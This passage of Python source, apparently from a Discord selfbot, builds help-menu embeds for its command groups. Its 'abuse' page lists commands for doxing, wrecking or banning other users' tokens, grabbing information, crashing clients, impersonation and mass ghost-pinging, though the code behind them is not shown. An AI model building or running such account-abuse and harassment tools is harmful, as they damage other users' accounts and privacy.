**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('strike').usage}** ¬ª {React.get_command('strike').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spoil').usage}** ¬ª {React.get_command('spoil').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lspoil').usage}** ¬ª {React.get_command('lspoil').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bold').usage}** ¬ª {React.get_command('bold').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('italic').usage}** ¬ª {React.get_command('italic').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('underline').usage}** ¬ª {React.get_command('underline').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('blockquote').usage}** ¬ª {React.get_command('blockquote').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('upper').usage}** ¬ª {React.get_command('upper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lower').usage}** ¬ª {React.get_command('lower').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('randomguildemoji').usage}** ¬ª {React.get_command('randomguildemoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('countdown').usage}** ¬ª {React.get_command('countdown').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('texttobinary').usage}** ¬ª {React.get_command('texttobinary').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('binarytotext').usage}** ¬ª {React.get_command('binarytotext').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('toenchantmenttable').usage}** ¬ª {React.get_command('toenchantmenttable').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cembed').usage}** ¬ª {React.get_command('cembed').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('clear').usage}** ¬ª {React.get_command('clear').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('shrug').usage}** ¬ª {React.get_command('shrug').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tableflip').usage}** ¬ª {React.get_command('tableflip').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unflip').usage}** ¬ª {React.get_command('unflip').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('emoji').usage}** ¬ª {React.get_command('emoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vape').usage}** ¬ª {React.get_command('vape').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('space').usage}** ¬ª {React.get_command('space').description}''',timestamp=embed_timestamp())
        em3.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em3.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em3.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)

        elif page == '2':
            await embed_or_codeblock(ctx, em2)

        elif page == '3':
            await embed_or_codeblock(ctx, em3)

        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)
            await embed_or_codeblock(ctx, em2)
            await embed_or_codeblock(ctx, em3)



    @React.command(usage="markdownblocks", description="Shows available Markdown code block commands")
    async def markdownblocks(ctx):
        try:
            em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
            f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'cpp').usage}** ¬ª {React.get_command('cpp').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'cs').usage}** ¬ª {React.get_command('cs').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'java').usage}** ¬ª {React.get_command('java').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'py').usage}** ¬ª {React.get_command('py').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'js').usage}** ¬ª {React.get_command('js').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'lua').usage}** ¬ª {React.get_command('lua').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'php').usage}** ¬ª {React.get_command('php').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'html').usage}** ¬ª {React.get_command('html').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'css').usage}** ¬ª {React.get_command('css').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'yaml').usage}** ¬ª {React.get_command('yaml').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'_json').usage}** ¬ª {React.get_command('_json').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'ini').usage}** ¬ª {React.get_command('ini').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'xml').usage}** ¬ª {React.get_command('xml').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'swift').usage}** ¬ª {React.get_command('swift').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'sql').usage}** ¬ª {React.get_command('sql').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'matlab').usage}** ¬ª {React.get_command('matlab').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'bash').usage}** ¬ª {React.get_command('bash').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'go').usage}** ¬ª {React.get_command('go').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'http').usage}** ¬ª {React.get_command('http').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'perl').usage}** ¬ª {React.get_command('perl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'rust').usage}** ¬ª {React.get_command('rust').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'asciidoc').usage}** ¬ª {React.get_command('asciidoc').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'ahk').usage}** ¬ª {React.get_command('ahk').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'coffeescript').usage}** ¬ª {React.get_command('coffeescript').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'diff').usage}** ¬ª {React.get_command('diff').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'fix').usage}** ¬ª {React.get_command('fix').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'ml').usage}** ¬ª {React.get_command('ml').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'prolog').usage}** ¬ª {React.get_command('prolog').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'xl').usage}** ¬ª {React.get_command('xl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f'ruby').usage}** ¬ª {React.get_command('ruby').description}''', timestamp=embed_timestamp())
            em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, em)
        except Exception as err:
            print(err)
            
    @React.command(usage="sleek", description="Shows available Sleek.to commands")
    async def sleek(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Please note that sleeklaunch is currently not working due to sleek.to support not answering tickets since multiple months.
        
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sleeklaunch').name}** ¬ª {React.get_command('sleeklaunch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sleekstop').name}** ¬ª {React.get_command('sleekstop').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sleekstatus').name}** ¬ª {React.get_command('sleekstatus').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sleekmethods').name}** ¬ª {React.get_command('sleekmethods').description}''', timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="networking", description="Networking commands")
    async def networking(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rdns').name}** ¬ª {React.get_command('rdns').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('httpheaders').name}** ¬ª {React.get_command('httpheaders').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('crawl').name}** ¬ª {React.get_command('crawl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('traceroute').name}** ¬ª {React.get_command('traceroute').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('showping').name}** ¬ª {React.get_command('showping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('host2ip').name}** ¬ª {React.get_command('host2ip').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ipresolve').name}** ¬ª {React.get_command('ipresolve').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('portscan').name}** ¬ª {React.get_command('portscan').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('iptype').name}** ¬ª {React.get_command('iptype').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('subnetcalc').name}** ¬ª {React.get_command('subnetcalc').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('aslookup').name}** ¬ª {React.get_command('aslookup').description}''', timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="voice", description="Voice commands")
    async def voice(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcdisconnectall').name}** ¬ª {React.get_command('vcdisconnectall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcdisconnect').name}** ¬ª {React.get_command('vcdisconnect').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcmovespam').name}** ¬ª {React.get_command('vcmovespam').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcdeafen').name}** ¬ª {React.get_command('vcdeafen').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcmute').name}** ¬ª {React.get_command('vcmute').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcundeafen').name}** ¬ª {React.get_command('vcundeafen').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vcunmute').name}** ¬ª {React.get_command('vcunmute').description}''', timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


    @React.command(usage="administration", description="Administration commands")
    async def administration(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ban').name}** ¬ª {React.get_command('ban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('softban').name}** ¬ª {React.get_command('softban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hackban').name}** ¬ª {React.get_command('hackban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unban').name}** ¬ª {React.get_command('unban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('kick').name}** ¬ª {React.get_command('kick').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('delinvites').name}** ¬ª {React.get_command('delinvites').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('addemoji').name}** ¬ª {React.get_command('addemoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('editemoji').name}** ¬ª {React.get_command('editemoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('emojidelete').name}** ¬ª {React.get_command('emojidelete').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('slowmode').name}** ¬ª {React.get_command('slowmode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lockchannel').name}** ¬ª {React.get_command('lockchannel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unlockchannel').name}** ¬ª {React.get_command('unlockchannel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pin').name}** ¬ª {React.get_command('pin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unpin').name}** ¬ª {React.get_command('unpin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('semimute').name}** ¬ª {React.get_command('semimute').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unsemimute').name}** ¬ª {React.get_command('unsemimute').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('clearsemimute').name}** ¬ª {React.get_command('clearsemimute').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nick').name}** ¬ª {React.get_command('nick').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('voice').name}** ¬ª {React.get_command('voice').description}''', timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)

    @React.command(usage="abuse", description="Abusive commands")
    async def abuse(ctx):
        page = '1'
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('invisibleping').name}** ¬ª {React.get_command('invisibleping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hiddeninvite').name}** ¬ª {React.get_command('hiddeninvite').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hiddenlink').name}** ¬ª {React.get_command('hiddenlink').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hiddeneveryone').name}** ¬ª {React.get_command('hiddeneveryone').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fakelink').name}** ¬ª {React.get_command('fakelink').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dox').name}** ¬ª {React.get_command('dox').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tokenfucker').name}** ¬ª {React.get_command('tokenfucker').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nuketoken').name}** ¬ª {React.get_command('nuketoken').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bantoken').name}** ¬ª {React.get_command('bantoken').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('blackscreenurl').name}** ¬ª {React.get_command('blackscreenurl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('gping').name}** ¬ª {React.get_command('gping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('impersonate').name}** ¬ª {React.get_command('impersonate').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('delwebhook').name}** ¬ª {React.get_command('delwebhook').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('infograbber').name}** ¬ª {React.get_command('infograbber').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('miraicrash').name}** ¬ª {React.get_command('miraicrash').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('massghostping').name}** ¬ª {React.get_command('massghostping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('globalmassghostping').name}** ¬ª {React.get_command('globalmassghostping').description}''', timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)
        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)


    @React.command(usage="tool [Page/All]", description="Tool commands")
    async def tool(ctx, page: str = None):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 1/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('encryption').name}** ¬ª {React.get_command('encryption').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fakenitro').name}** ¬ª {React.get_command('fakenitro').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fakeskeet').name}** ¬ª {React.get_command('fakeskeet').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('firstmessage').name}** ¬ª {React.get_command('firstmessage').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dumpchat').name}** ¬ª {React.get_command('dumpchat').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('timer').name}** ¬ª {React.get_command('timer').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('savebackup').name}** ¬ª {React.get_command('savebackup').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('loadbackup').name}** ¬ª {React.get_command('loadbackup').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletebackup').name}** ¬ª {React.get_command('deletebackup').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('listbackup').name}** ¬ª {React.get_command('listbackup').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('passwordgen').name}** ¬ª {React.get_command('passwordgen').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('calculator').name}** ¬ª {React.get_command('calculator').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('winexplorer').name}** ¬ª {React.get_command('winexplorer').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('folder').name}** ¬ª {React.get_command('folder').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('webopen').name}** ¬ª {React.get_command('webopen').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('leavegroups').name}** ¬ª {React.get_command('leavegroups').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fakedata').name}** ¬ª {React.get_command('fakedata').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bottoken').name}** ¬ª {React.get_command('bottoken').description}''', timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
